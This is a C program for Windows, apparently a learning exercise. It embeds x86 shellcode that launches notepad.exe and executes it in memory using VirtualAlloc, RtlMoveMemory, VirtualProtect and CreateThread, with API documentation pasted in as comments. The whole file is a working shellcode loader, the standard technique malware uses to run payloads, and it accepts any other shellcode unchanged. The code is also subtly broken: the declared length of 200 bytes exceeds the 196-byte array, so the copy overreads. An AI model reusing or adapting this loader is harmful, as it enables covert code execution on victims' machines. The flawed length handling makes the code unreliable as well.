#include <windows.h>
#include <stdio.h>
#include <winnt.h>

int main()
{
    // shell code to be embedded  this payload for x86 architecture not x64 

    unsigned char shellcode[196] = {
        0xFC, 0xE8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xE5, 0x31, 0xC0, 0x64,
        0x8B, 0x50, 0x30, 0x8B, 0x52, 0x0C, 0x8B, 0x52, 0x14, 0x8B, 0x72, 0x28,
        0x0F, 0xB7, 0x4A, 0x26, 0x31, 0xFF, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C,
        0x20, 0xC1, 0xCF, 0x0D, 0x01, 0xC7, 0xE2, 0xF2, 0x52, 0x57, 0x8B, 0x52,
        0x10, 0x8B, 0x4A, 0x3C, 0x8B, 0x4C, 0x11, 0x78, 0xE3, 0x48, 0x01, 0xD1,
        0x51, 0x8B, 0x59, 0x20, 0x01, 0xD3, 0x8B, 0x49, 0x18, 0xE3, 0x3A, 0x49,
        0x8B, 0x34, 0x8B, 0x01, 0xD6, 0x31, 0xFF, 0xAC, 0xC1, 0xCF, 0x0D, 0x01,
        0xC7, 0x38, 0xE0, 0x75, 0xF6, 0x03, 0x7D, 0xF8, 0x3B, 0x7D, 0x24, 0x75,
        0xE4, 0x58, 0x8B, 0x58, 0x24, 0x01, 0xD3, 0x66, 0x8B, 0x0C, 0x4B, 0x8B,
        0x58, 0x1C, 0x01, 0xD3, 0x8B, 0x04, 0x8B, 0x01, 0xD0, 0x89, 0x44, 0x24,
        0x24, 0x5B, 0x5B, 0x61, 0x59, 0x5A, 0x51, 0xFF, 0xE0, 0x5F, 0x5F, 0x5A,
        0x8B, 0x12, 0xEB, 0x8D, 0x5D, 0x6A, 0x01, 0x8D, 0x85, 0xB2, 0x00, 0x00,
        0x00, 0x50, 0x68, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5,
        0xA2, 0x56, 0x68, 0xA6, 0x95, 0xBD, 0x9D, 0xFF, 0xD5, 0x3C, 0x06, 0x7C,
        0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A,
        0x00, 0x53, 0xFF, 0xD5, 0x6E, 0x6F, 0x74, 0x65, 0x70, 0x61, 0x64, 0x2E,
        0x65, 0x78, 0x65, 0x00
    };
    // shell code length
    DWORD shellcode_len = 200;

    // how can allocate virtual memmory in windows
    // this may be virtual alloc or virtual allocex

    LPVOID memoryAdress = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // load shell code into memory
    // Copies the contents of a source memory block to a destination memory block,
    // and supports overlapping source and destination memory blocks.
    RtlMoveMemory(memoryAdress, shellcode, shellcode_len);

    // Changes the protection of LPVOID memoryAdress to PAGE_EXECUTE_READ
    // --> so this make shellcode in this memory executable
    // Changes the protection on a region of committed pages in the virtual
    // address space of the calling process.
    // To change the access protection of any process, use the VirtualProtectEx function.
    DWORD oldProtect = 0;
    BOOL isSucess = VirtualProtect(memoryAdress, shellcode_len, PAGE_EXECUTE_READ, &oldProtect
        // [in]  LPVOID lpAddress,
        // [in]  SIZE_T dwSize,
        // [in]  DWORD  flNewProtect,
        // [out] PDWORD lpflOldProtect
    );

    // create a thread to execute the shell code

    if (isSucess != NULL)
    {
        HANDLE thread1_handle = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)memoryAdress, NULL, NULL, NULL

            // [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes, --- A pointer to a SECURITY_ATTRIBUTES structure that determines whether the returned handle can be inherited by child processes. If lpThreadAttributes is NULL, the handle cannot be inherited.
            // [in]            SIZE_T                  dwStackSize,  --- he initial size of the stack, in bytes. The system rounds this value to the nearest page. If this parameter is zero, the new thread uses the default size for the executable. For more information, see Thread Stack Size.
            // [in]            LPTHREAD_START_ROUTINE  lpStartAddress, --- A pointer to the application-defined function to be executed by the thread. This pointer represents the starting address of the thread. For more information on the thread function, see ThreadProc.
            // [in, optional]  __drv_aliasesMem LPVOID lpParameter, -- A pointer to a variable to be passed to the thread.
            // [in]            DWORD                   dwCreationFlags,  -- The flags that control the creation of the thread.
            // [out, optional] LPDWORD                 lpThreadId -- A pointer to a variable that receives the thread identifier. If this parameter is NULL, the thread identifier is not returned.
        );

        // wait for thread complete
        // https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject

        // If the function succeeds, the return value is a handle to the new thread.
        // If the function fails, the return value is NULL
        WaitForSingleObject(thread1_handle, INFINITE
            // [in] HANDLE hHandle, --
            // [in] DWORD  dwMilliseconds

        );
    }
    return 1;
}